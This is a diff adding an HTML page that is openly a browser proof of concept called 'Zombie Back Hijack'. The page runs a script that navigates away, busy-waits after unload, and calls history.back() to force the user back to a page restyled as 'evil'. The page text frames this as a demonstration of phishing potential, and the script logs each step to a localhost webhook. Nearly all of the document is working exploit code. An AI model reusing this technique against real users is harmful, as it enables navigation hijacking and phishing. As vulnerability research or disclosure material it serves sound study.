@@ -1,0 +1,163 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Cross-Origin Navigation PoC (Zombie Back Hijack)</title>
+<style>
+:root{
+  --pink1:#ffd5f4;--pink2:#ffc2ec;--accent:#ff47b4;
+  --evil1:#2a0006;--evil2:#5a0011;--evilAccent:#ff375f;
+  --fg:#111;--fgE:#fff;--cardBG:rgba(255,255,255,.85);--cardE:rgba(0,0,0,.48);
+  --shadow:0 10px 30px rgba(0,0,0,.18)
+}
+*{box-sizing:border-box}html,body{height:100%}
+body{margin:0;font:14px/1.45 ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Inter,Arial;display:grid;place-items:center;transition:background .3s,color .3s}
+.safe{background:linear-gradient(135deg,var(--pink1),var(--pink2));color:var(--fg)}
+.evil{background:linear-gradient(135deg,var(--evil1),var(--evil2));color:var(--fgE)}
+.container{width:min(740px,92vw);padding:28px 24px;border-radius:16px;box-shadow:var(--shadow);backdrop-filter:saturate(1.2) blur(6px)}
+.safe .container{background:var(--cardBG);border:1px solid rgba(255,71,180,.25)}
+.evil .container{background:var(--cardE);border:1px solid rgba(255,55,95,.35)}
+.h{display:flex;align-items:center;gap:10px;margin:0 0 18px}
+.h h2{margin:0}
+.badge{font-size:12px;padding:4px 8px;border-radius:999px}
+.safe .badge{background:rgba(255,71,180,.15);color:#7a0052}
+.evil .badge{background:rgba(255,55,95,.2);color:#ffd5de}
+.row{display:flex;gap:10px}
+input[type=url]{flex:1;min-width:0;padding:12px 14px;border-radius:12px;border:1px solid #e5e5e5;outline:0;font:inherit;box-shadow:inset 0 0 0 999px rgba(255,255,255,.6)}
+.safe input[type=url]:focus{border-color:var(--accent)}
+.evil input[type=url]{border-color:#8a0020;background:rgba(255,255,255,.06);color:#fff}
+.btn{cursor:pointer;border:0;border-radius:12px;padding:12px 16px;font-weight:700;letter-spacing:.2px}
+.safe .btn{background:var(--accent);color:#fff}
+.evil .btn{background:var(--evilAccent);color:#fff}
+.meta{margin-top:14px;opacity:.85;word-break:break-word}
+.kv{display:grid;grid-template-columns:160px 1fr;gap:6px 10px;margin-top:10px}
+.kv div:first-child{opacity:.8}
+.footer{margin-top:18px;opacity:.7;font-size:12px}
+code{background:rgba(0,0,0,.08);padding:.1em .33em;border-radius:6px}
+.evil code{background:rgba(255,255,255,.12)}
+a{color:inherit}
+</style>
+</head>
+<body class="safe">
+  <div id="app" class="container"></div>
+
+<script>
+/* 
+   Zombie Navigation PoC (Zombie Back Hijack)
+   - Stores a tab-scoped marker BEFORE navigation
+   - Navigates away, then (post-unload) runs a tick that busy-sleeps and calls history.back()
+   - On return (Back), shows the stored marker and clears it
+   - Safe page (pink) vs Evil page (dark red) visuals
+*/
+
+(()=>{"use strict";
+
+  const WEBHOOK = "http://localhost:8080/test";  // change for your log page (node server I used is included)
+  const STORE   = "__tab_nav_info__";            // localStorage key
+
+  // Fetch based log.
+  function L(label, body=null){
+    try{ fetch(WEBHOOK,{method:"POST",keepalive:true,body: body || label}); }catch(_){}
+  }
+
+  const esc = s => String(s).replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[m]));
+  const iso = t => { try{ const d=new Date(t); return isFinite(+d)?d.toISOString():String(t);}catch{return String(t)} };
+
+  // Busy-wait sleep: synchronous to block the page from death.
+  function sleep(ms){ const end=Date.now()+ms; while(Date.now()<end){} }
+
+  function renderSafe(){
+    document.body.className="safe";
+    const el = document.getElementById("app");
+    el.innerHTML =
+      '<div class="h"><h2>SAFE - Cross-origin Nav Demo</h2><span class="badge">safe.</span></div>'
+    + '<p style="margin:0 0 12px">Enter a destination URL. Clicking <b>NAVIGATE</b> stores a tab-local marker in <code>localStorage</code> and goes there. Then, the PoC tries to <code>history.back()</code> after a synchronous busy-wait.</p>'
+    + '<div class="row">'
+      + '<input id="u" type="url" inputmode="url" spellcheck="false" autocomplete="off" placeholder="https://example.com" value="https://example.com">'
+      + '<button id="go" class="btn">NAVIGATE -></button>'
+    + '</div>'
+    + '<div class="meta">State: a JSON marker is written to <code>localStorage["'+STORE+'"]</code> before navigation. If BFCached, it changes the page BEFORE return, since DOM is still alive. If not BFCached, it changes the page to be evil on load. Clears the marker either way.</div>'
+
+    document.getElementById("go").onclick = () => {
+      const url = (document.getElementById("u").value||"").trim() || "https://example.com";
+      startExploit(url);
+    };
+  }
+
+  function renderEvil(info){
+    document.body.className="evil";
+    const el = document.getElementById("app");
+    el.innerHTML =
+      '<div class="h"><h2>EVIIL - Returned to This Tab</h2><span class="badge">evil..</span></div>'
+    + '<p style="margin:0 0 8px">This tab is now evil. Mainly to implicate how easily this can be used for something like phishing.</p>'
+    + '<div class="kv">'
+      + '<div>Destination URL</div><div><code>'+esc(info.url||"")+'</code></div>'
+      + '<div>From URL</div><div><code>'+esc(info.from||"")+'</code></div>'
+      + '<div>Set At</div><div>'+iso(info.ts)+'</div>'      
+      + '<div>BFCached</div><div><code>'+esc(info.BFCached)+'</code></div>'
+    + '</div>'
+    + '<div class="footer">Note, the destination is known only because you used the input to go there, it\'s included to make the page look less bland. Try another destination!</div>';
+  }
+
+
+  function startExploit(destUrl){
+    const marker = {
+      url: destUrl,
+      from: location.href,
+      ts: Date.now(),
+      BFCached: true
+    };
+    try{ localStorage.setItem(STORE, JSON.stringify(marker)); }catch(_){}
+    L("[PoC] marker-set: "+JSON.stringify(marker));
+
+
+
+    setTimeout(() => {
+        window.evil = window.location.href = ("https://example.com/");
+    }, 1)
+    setTimeout(async () => { tick() },1) 
+
+
+
+  }
+
+  // Tick runs after nav is initiated; it busy-sleeps and then tries to force a Back
+  function tick(){
+    try{
+      L("[PoC] tick:start");        
+      // BFCache version.
+      renderEvil(JSON.parse(localStorage.getItem(STORE)));
+      // Long synchronous stall to extend the window's life
+      sleep(2300);
+      // Attempt to yank the tab back to prior entry
+      history.back();
+      L("[PoC] tick:history.back() called");
+    }catch(e){
+      L("[PoC] tick:error: "+(e&&e.message||e));
+    }
+    try{ localStorage.removeItem(STORE); }catch(_){}
+  }
+
+
+  (function boot(){
+    try{ window.focus(); }catch(_){}
+    // Decide which view to render based on marker presence (if BFCache killed us)
+    let raw=null, info=null;
+    try{ raw = localStorage.getItem(STORE); }catch(_){}
+    if(raw){
+      try{ info = JSON.parse(raw)||{raw}; }catch(_){ info={raw}; }
+      try{ localStorage.removeItem(STORE); }catch(_){}
+      info.BFCached=false;
+      renderEvil(info);
+      L("[PoC] returned-with-marker");
+    }else{
+      renderSafe();
+      L("[PoC] ready");
+    }
+  })();
+
+})();
+</script>
+</body>
+</html>
